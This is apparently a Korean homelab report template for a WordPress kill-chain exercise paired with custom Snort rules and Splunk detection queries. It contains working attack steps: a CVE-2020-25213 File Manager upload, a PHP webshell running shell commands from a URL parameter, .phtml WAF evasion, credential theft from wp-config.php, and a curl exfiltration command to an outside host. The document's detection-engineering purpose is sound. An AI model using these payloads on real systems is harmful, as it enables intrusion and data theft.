# Phase 3 — 킬체인 공격 + 탐지 엔지니어링

> 테크솔루션 WordPress 홈페이지 대상 킬체인 공격 수행 및 커스텀 탐지 규칙 구축

---

## 공격 시나리오

**"외부 해커가 회사 홈페이지를 통해 고객 DB 탈취 시도"**

| 단계 | Kill Chain | MITRE ATT&CK | 공격 행위 | 도구 |
|------|-----------|-------------|----------|------|
| 1 | 정찰 | T1595 Active Scanning | WordPress 버전·플러그인 스캔 | wpscan, nmap |
| 2 | 초기 침투 | T1190 Exploit Public-Facing App | 취약 플러그인 SQLi, File Manager 취약점 | sqlmap, 수동 |
| 3 | 인증 공격 | T1110 Brute Force | wp-login.php / xmlrpc.php 브루트포스 | hydra, wpscan |
| 4 | 지속성 확보 | T1505.003 Web Shell | PHP 웹쉘 업로드 (.phtml WAF 우회) | File Manager CVE |
| 5 | 내부 정찰 | T1046 Network Service Scanning | 웹쉘에서 내부 네트워크 스캔 | 웹쉘 CLI |
| 6 | DB 접근 | T1213 Data from Information Repos | MySQL 직접 접근, 고객 데이터 조회 | mysql CLI |
| 7 | 유출 시도 | T1041 Exfiltration Over C2 | 데이터 외부 전송 시도 | curl, wget |

---

## Step 1. 킬체인 공격 수행

### 1-1. 정찰 (Reconnaissance)

**wpscan 스캔:**
```bash
# Kali (10.50.50.30)
wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --api-token [TOKEN]
```

**결과:**
<!-- 실습 후 기록 -->

**탐지 확인:**
- Apache access.log: <!-- 로그 확인 -->
- Snort: <!-- 경보 확인 -->
- ModSecurity: <!-- WAF 로그 확인 -->

---

### 1-2. SQL Injection (초기 침투)

**수동 SQLi:**
```bash
# WordPress 검색 기능 또는 플러그인 파라미터 대상
sqlmap -u "http://10.0.0.254:8080/?s=test" --dbs
```

**결과:**
<!-- 실습 후 기록 -->

**다중 소스 탐지 확인:**
- Snort: <!-- ET WEB_SERVER 경보 -->
- ModSecurity: <!-- 942xxx 탐지 로그 (차단 안 됨, DetectionOnly) -->
- Apache access.log: <!-- 비정상 파라미터 -->

---

### 1-3. 브루트포스 (인증 공격)

**wp-login.php 브루트포스:**
```bash
# Kali
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    10.0.0.254 http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -s 8080
```

**xmlrpc.php 멀티콜:**
```bash
curl -X POST http://10.0.0.254:8080/xmlrpc.php -d '
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>'
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-4. 웹쉘 업로드 (지속성)

**WP File Manager CVE-2020-25213:**
```bash
# .phtml로 WAF 우회
curl -X POST http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php \
    -F "cmd=upload" \
    -F "target=l1_d3AtY29udGVudC91cGxvYWRz" \
    -F "upload[]=@shell.phtml"
```

**웹쉘 내용 (shell.phtml):**
```php
<?php if(isset($_GET['cmd'])) echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-5. 내부 정찰 (웹쉘 통해)

```bash
# 웹쉘에서 실행
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=ifconfig"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=cat+/etc/passwd"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=nmap+-sn+10.0.100.0/24"
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-6. DB 접근 (고객 데이터)

```bash
# 웹쉘에서 MySQL 접근 (wp-config.php에서 인증정보 획득)
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=cat+/var/www/html/wp-config.php"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=mysql+-h+10.0.100.60+-u+wp_admin+-pWpAdmin!2024+-e+'SELECT+*+FROM+wordpress.wp_customers+LIMIT+10'"
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-7. 유출 시도 (차단 확인)

```bash
# 웹쉘에서 외부 전송 시도 → DMZNET 아웃바운드 차단에 의해 실패
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=curl+http://10.50.50.17:8888/exfil+-d+@/tmp/data.csv"
```

**결과:**
<!-- 차단 확인 후 기록 -->

---

## Step 2. 커스텀 탐지 규칙 구축

### 2-1. Snort 커스텀 룰 — SID별 탐지 검증

`phase2.5-setup/configs/snort/local.rules`에 정의된 9개 룰 적용 후 탐지 테스트.

> **검증 방법:** pfSense > Services > Snort > Alerts 탭에서 각 SID 경보 확인.  
> Splunk에서 교차 확인: `index=pfsense "[LOCAL]"` 으로 커스텀 룰 경보만 필터링.

---

#### SID 1000001 — WP Login Brute Force

**룰 조건:** `/wp-login.php` POST 요청 5회/60초 초과 시 경보

**트리거 명령 (Kali):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    10.0.0.254 http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" \
    -s 8080 -t 10 -V
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "WordPress Login Brute Force"
| table _time, src_ip, dest_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WordPress Login Brute Force Attempt
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (hydra 브루트포스)
```

---

#### SID 1000002 — XML-RPC Brute Force

**룰 조건:** `/xmlrpc.php` POST + `wp.getUsersBlogs` body 3회/60초 초과

**트리거 명령 (Kali):**
```bash
# multicall 방식으로 반복 요청
for i in $(seq 1 10); do
  curl -s -X POST http://10.0.0.254:8080/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>admin</value></param>
<param><value>password'$i'</value></param></params></methodCall>'
done

# wpscan XML-RPC 브루트포스 모드
wpscan --url http://10.0.0.254:8080 \
    --passwords /usr/share/wordlists/rockyou.txt \
    --usernames admin \
    --xmlrpc
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "XML-RPC Brute Force"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WordPress XML-RPC Brute Force
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (XML-RPC multicall 인증 공격)
```

---

#### SID 1000003 — PHP File Upload

**룰 조건:** multipart/form-data POST + body에 `.php` 문자열 포함

**트리거 명령 (Kali):**
```bash
# 테스트용 PHP 파일 업로드 (WP File Manager)
echo '<?php phpinfo(); ?>' > /tmp/test.php
curl -X POST http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php \
    -F "cmd=upload" \
    -F "target=l1_d3AtY29udGVudC91cGxvYWRz" \
    -F "upload[]=@/tmp/test.php"
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "Suspicious PHP File Upload"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] Suspicious PHP File Upload Detected
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (악성 PHP 업로드)
```

---

#### SID 1000004 — PHTML WAF Bypass

**룰 조건:** POST body에 `.phtml` 문자열 포함

**트리거 명령 (Kali):**
```bash
# .phtml 웹쉘 업로드 (WAF 우회 핵심 단계)
cat > /tmp/shell.phtml << 'EOF'
<?php if(isset($_GET['cmd'])) echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
EOF

curl -X POST http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php \
    -F "cmd=upload" \
    -F "target=l1_d3AtY29udGVudC91cGxvYWRz" \
    -F "upload[]=@/tmp/shell.phtml"
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "PHTML File Upload"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] PHTML File Upload - Possible WAF Bypass
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (.phtml ModSecurity 우회 업로드)
비고       : SID 1000003과 동시 발생 여부 확인
```

---

#### SID 1000005 — DMZ→Inner Non-MySQL

**룰 조건:** 10.0.10.0/24 → 10.0.100.0/24, 목적지 포트 3306 外 TCP

**트리거 명령 (웹쉘에서):**
```bash
# 웹쉘을 통해 내부망 스캔 (3306 외 포트 접근)
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=nmap+-sT+-p+22,80,443,8000+10.0.100.50"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=curl+http://10.0.100.50:8000"
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "DMZ to Inner-net Non-MySQL"
| table _time, src_ip, dest_ip, dest_port, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] DMZ to Inner-net Non-MySQL Traffic
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (웹쉘 → 내부망 비인가 접근)
비고       : MySQL(3306) 정상 통신은 탐지되지 않아야 함 확인
```

---

#### SID 1000006 — DMZ→Mng Access

**룰 조건:** 10.0.10.0/24 → 10.0.50.0/24 IP 통신

**트리거 명령 (웹쉘에서):**
```bash
# 관리망 접근 시도
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=ping+-c+3+10.0.50.17"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=curl+http://10.0.50.17"
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "DMZ to Management Network"
| table _time, src_ip, dest_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] DMZ to Management Network Access Attempt
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (횡이동 시도 — 관리망 침투 징후)
```

---

#### SID 1000007 — Webshell Command Output

**룰 조건:** 서버 응답에 `uid=` + `gid=` 30바이트 이내 동시 포함

**트리거 명령 (Kali):**
```bash
# whoami / id 명령 실행 → 응답에 uid=33(www-data) gid=33(www-data) 포함
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=id"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=whoami"
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "Possible Webshell Command Output"
| table _time, src_ip, dest_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] Possible Webshell Command Output in Response
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (웹쉘 명령 실행 응답 탐지)
비고       : 응답 방향(from_server) 탐지라 업로드 시점보다 늦게 확인됨
```

---

#### SID 1000008 — WP File Manager CVE-2020-25213

**룰 조건:** URI에 `/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php` 포함

**트리거 명령 (Kali):**
```bash
# File Manager 엔드포인트 접근만으로 탐지
curl -X POST "http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
    -F "cmd=ls" -F "target=l1_."
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "WP File Manager RCE"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WP File Manager RCE Attempt (CVE-2020-25213)
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (CVE-2020-25213 익스플로잇 접근)
```

---

#### SID 1000009 — WPScan Detection

**룰 조건:** HTTP 헤더에 `WPScan` 문자열 포함

**트리거 명령 (Kali):**
```bash
wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "WPScan Scanner Detected"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WPScan Scanner Detected
탐지 건수   : <!-- 결과 기록 -->
탐지 시각   : <!-- 결과 기록 -->
판별       : 정탐 (WordPress 취약점 스캐너 탐지)
비고       : --random-user-agent 옵션 사용 시 우회 가능 (한계점)
```

---

### 2-2. Snort SID 탐지 결과 요약

| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 | 경보 건수 |
|-----|---------|-----------|----------|---------|
| 1000001 | WP Login Brute Force | 인증 공격 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000002 | XML-RPC Brute Force | 인증 공격 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000003 | PHP File Upload | 지속성 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000004 | PHTML WAF Bypass | 지속성 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000006 | DMZ→Mng Access | 내부 정찰 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000007 | Webshell Output | 지속성 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000008 | WP File Manager CVE | 초기 침투 | <!-- ✅/❌ --> | <!-- N건 --> |
| 1000009 | WPScan Detection | 정찰 | <!-- ✅/❌ --> | <!-- N건 --> |

**커스텀 룰 전체 확인 쿼리 (Splunk):**
```spl
index=pfsense "[LOCAL]"
| rex field=_raw "sid:(?<sid>\d+)"
| stats count by sid, msg
| sort sid
```

---

### 2-3. Splunk 상관분석 쿼리

> **기본 인덱스 구조:**
> - `pfsense` — Snort 경보 + pfSense 방화벽 로그
> - `idx_web` — Apache access/error log (WordPress 서버)
> - `idx_waf` — ModSecurity WAF 로그
> - `idx_db` — MySQL slow query / error log

---

#### 상관분석 1. 브루트포스 탐지 — 다중 소스 교차

```spl
(index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST")
OR (index=pfsense "[LOCAL] WordPress Login Brute Force")
| eval source=if(index="idx_web","Apache","Snort")
| eval attacker=coalesce(clientip, src_ip)
| stats count by attacker, source
| where count > 5
| sort -count
| rename attacker as "공격자 IP", count as "요청 수", source as "탐지 소스"
```

**결과:**
```
공격자 IP     | 탐지 소스 | 요청 수
<!-- 결과 기록 -->
```

---

#### 상관분석 2. SQLi 다중 소스 교차 검증

```spl
(index=pfsense ("SQL" OR "SQLI" OR "sql injection") src_ip=*)
  OR (index=idx_waf "942" src_ip=*)
| eval layer=case(
    index="pfsense" AND match(_raw,"ET WEB_SERVER"), "Snort/ET",
    index="pfsense" AND match(_raw,"LOCAL"), "Snort/커스텀",
    index="idx_waf", "ModSecurity")
| eval attacker=coalesce(src_ip, clientip)
| stats count by attacker, layer
| where count > 3
| sort -count
```

**결과:**
```
공격자 IP     | 탐지 계층 | 경보 수
<!-- 결과 기록 -->
```

---

#### 상관분석 3. 웹쉘 업로드 → 실행 시퀀스 탐지

```spl
index=idx_web sourcetype="apache:access"
  (uri="*.phtml" OR uri="*/uploads/*.php" OR uri="*/uploads/*.phtml")
| eval phase=case(
    method="POST", "업로드 시도",
    method="GET" AND match(uri,"cmd="), "명령 실행",
    true(), "접근")
| stats count values(uri) as uri_list by clientip, phase
| sort -count
| rename clientip as "공격자 IP"
```

**결과:**
```
공격자 IP     | 단계    | 접근 수 | URI 목록
<!-- 결과 기록 -->
```

---

#### 상관분석 4. 킬체인 타임라인 재구성

```spl
(index=pfsense "[LOCAL]" src_ip=10.50.50.30)
  OR (index=idx_web clientip=10.50.50.30)
  OR (index=idx_waf src_ip=10.50.50.30)
| eval event_type=case(
    match(_raw,"WPScan"),          "① 정찰(WPScan)",
    match(_raw,"sql|SQL|942"),     "② SQLi",
    match(_raw,"Brute Force"),     "③ 브루트포스",
    match(_raw,"File Manager"),    "④ CVE 파일매니저",
    match(_raw,"phtml|PHP Upload"),"⑤ 웹쉘 업로드",
    match(uri,"cmd="),             "⑥ 웹쉘 실행",
    match(_raw,"Inner-net"),       "⑦ 내부 정찰",
    match(_raw,"Management"),      "⑧ 관리망 접근",
    true(),                        "기타")
| timechart span=5m count by event_type
```

> Visualization: **Line Chart** — 공격 단계별 시간대 분포 확인

**결과:**
```
<!-- 타임차트 결과 요약 기록 -->
```

---

#### 상관분석 5. DB 접근 이상 탐지

```spl
index=idx_db (sourcetype="mysql:slow" OR sourcetype="mysql:error")
| eval is_external=if(match(host,"10\.0\.10\."), "DMZ(비정상)", "정상")
| stats count by host, is_external, user
| where is_external="DMZ(비정상)"
```

**결과:**
```
접근 호스트   | 분류    | DB 사용자 | 쿼리 수
<!-- 결과 기록 -->
```

---

#### 상관분석 6. Splunk Alert 설정 — 실시간 브루트포스 경보

> pfSense > Splunk > Alerts 메뉴에서 저장된 검색으로 Alert 등록

```spl
index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST"
| bucket _time span=1m
| stats count by _time, clientip
| where count >= 5
```

**Alert 설정:**
```
이름      : BruteForce_WPLogin_Alert
트리거    : count >= 5 / 1분
동작      : 이메일 또는 Splunk 알림
심각도    : High
```

---

#### 상관분석 7. 고위험 IP 종합 스코어링

```spl
(index=pfsense "[LOCAL]" OR index=idx_web OR index=idx_waf)
| eval attacker=coalesce(src_ip, clientip)
| eval score=case(
    match(_raw,"Brute Force"),  3,
    match(_raw,"File Upload"),  5,
    match(_raw,"phtml"),        5,
    match(_raw,"CVE"),          5,
    match(_raw,"cmd="),         8,
    match(_raw,"SQL|sql"),      3,
    true(),                     1)
| stats sum(score) as risk_score, count as event_count by attacker
| where risk_score > 10
| sort -risk_score
| rename attacker as "의심 IP", risk_score as "위험 점수", event_count as "이벤트 수"
```

**결과:**
```
의심 IP        | 위험 점수 | 이벤트 수 | 평가
<!-- 결과 기록 -->
```

---

## Step 3. 탐지 개선 비교

> **판단 기준:** 커스텀 룰 적용 전 = ET Open 룰만 사용 시, 적용 후 = 커스텀 9개 룰 추가 후

| 공격 단계 | 기본 ET Open | 커스텀 룰 후 | 개선 내용 | 탐지 건수(후) |
|---------|-------------|------------|---------|------------|
| WP 브루트포스 (1000001) | ❌ 미탐지 | <!-- ✅ 탐지 --> | threshold 기반 행위 탐지 | <!-- N건 --> |
| XML-RPC 브루트포스 (1000002) | ❌ 미탐지 | <!-- ✅ 탐지 --> | multicall 패턴 탐지 | <!-- N건 --> |
| PHP 업로드 (1000003) | ⚠️ 일부 탐지 | <!-- ✅ 탐지 --> | multipart+확장자 조합 강화 | <!-- N건 --> |
| PHTML WAF 우회 (1000004) | ❌ 미탐지 | <!-- ✅ 탐지 --> | .phtml 확장자 명시 탐지 | <!-- N건 --> |
| 내부망 스캔 (1000005) | ❌ 미탐지 | <!-- ✅ 탐지 --> | DMZ→inner 비MySQL 정책 | <!-- N건 --> |
| 관리망 접근 (1000006) | ❌ 미탐지 | <!-- ✅ 탐지 --> | DMZ→mng 세그먼트 정책 | <!-- N건 --> |
| 웹쉘 실행 응답 (1000007) | ❌ 미탐지 | <!-- ✅ 탐지 --> | 응답 uid/gid 패턴 탐지 | <!-- N건 --> |
| File Manager CVE (1000008) | ❌ 미탐지 | <!-- ✅ 탐지 --> | URI 패턴 CVE 매핑 | <!-- N건 --> |
| WPScan 스캐너 (1000009) | ❌ 미탐지 | <!-- ✅ 탐지 --> | UA 기반 스캐너 식별 | <!-- N건 --> |
| SQLi | ✅ Snort 탐지 | ✅ + WAF 교차 | Snort + ModSecurity 다중 검증 | 기존 유지 |

**한계점 (개선 전후 공통):**
- WPScan `--random-user-agent` 옵션 사용 시 SID 1000009 우회 가능
- SID 1000007(웹쉘 응답)은 HTTPS 환경에서 암호화로 탐지 불가
- Threshold 기반(1000001/1000002)은 저속 브루트포스(분산 공격) 회피 가능

---

## Step 4. 정탐/오탐 판별

| 경보 SID | 경보 메시지 | 출처 | 판별 | 판단 근거 |
|---------|-----------|------|------|---------|
| 1000009 | WPScan Scanner Detected | Snort | <!-- 정탐/오탐 --> | wpscan UA가 HTTP 헤더에 노출 |
| 1000001 | WP Login Brute Force | Snort | <!-- 정탐/오탐 --> | hydra 5회 이상/분 POST 확인 |
| 1000002 | XML-RPC Brute Force | Snort | <!-- 정탐/오탐 --> | xmlrpc.php 반복 POST 확인 |
| 1000008 | WP File Manager RCE | Snort | <!-- 정탐/오탐 --> | connector.minimal.php URI 접근 |
| 1000003 | PHP File Upload | Snort | <!-- 정탐/오탐 --> | multipart POST + .php 포함 |
| 1000004 | PHTML WAF Bypass | Snort | <!-- 정탐/오탐 --> | .phtml 업로드 = WAF 우회 의도적 |
| 1000007 | Webshell Output | Snort | <!-- 정탐/오탐 --> | 응답에 uid=www-data 포함 |
| 1000005 | DMZ→Inner Non-MySQL | Snort | <!-- 정탐/오탐 --> | 3306 외 포트로 내부망 접근 |
| 1000006 | DMZ→Mng Access | Snort | <!-- 정탐/오탐 --> | DMZ에서 관리망 접근 시도 |
| - | ET WEB_SERVER (SQLi) | Snort/ET | 정탐 | sqlmap User-Agent + SQL 구문 |
| - | ModSecurity 942xxx | WAF | 정탐 | SQL 패턴 탐지 (DetectionOnly 모드) |

**오탐 검토 항목:**
```
SID 1000003 (PHP File Upload):
  - 정상적인 WordPress 테마/플러그인 업로드 시에도 발생 가능
  - 완화: File Manager 플러그인 경로(connector.minimal.php) 조건 추가 권고

SID 1000007 (Webshell Output):
  - phpinfo() 실행 결과에도 uid= 포함 시 발생 가능
  - 완화: within 값을 10으로 축소하여 정밀도 향상 권고
```

---

## Step 5. 탐지 엔지니어링 개선 권고

| 우선순위 | 항목 | 현재 | 개선안 |
|---------|------|------|--------|
| 긴급 | 웹쉘 접근 차단 | 탐지만(DetectionOnly) | ModSecurity + Snort Block 연동 |
| 높음 | 분산 브루트포스 | 단일 IP threshold | Splunk ML 기반 이상 탐지 |
| 높음 | WPScan UA 우회 | UA 문자열 고정 탐지 | 스캐너 행위 패턴(요청 속도+URI 다양성) 탐지 |
| 중간 | DMZ 아웃바운드 | pfSense 차단 확인 | 차단 규칙 로그 → Splunk Alert 연동 |
| 중간 | DB 접근 이상 | MySQL 로그 수집 | 접근 패턴 기반 이상 탐지 Alert 추가 |

---

## 스크린샷

- [ ] wpscan 스캔 결과 + SID 1000009 경보
- [ ] SQLi 공격 + ModSecurity 로그 (942xxx)
- [ ] 브루트포스 + SID 1000001/1000002 경보
- [ ] File Manager CVE + SID 1000008 경보
- [ ] 웹쉘 업로드 + SID 1000003/1000004 경보
- [ ] 웹쉘 실행(id 명령) + SID 1000007 응답 탐지
- [ ] 내부 정찰 + SID 1000005/1000006 경보
- [ ] DB 데이터 조회 (고객 정보)
- [ ] 유출 시도 차단 (DMZNET 아웃바운드 차단 확인)
- [ ] Splunk 상관분석 1: 브루트포스 교차 탐지
- [ ] Splunk 상관분석 4: 킬체인 타임라인 timechart
- [ ] Splunk 상관분석 7: 위험 점수 스코어링
- [ ] 탐지 개선 전/후 비교표 (Step 3)
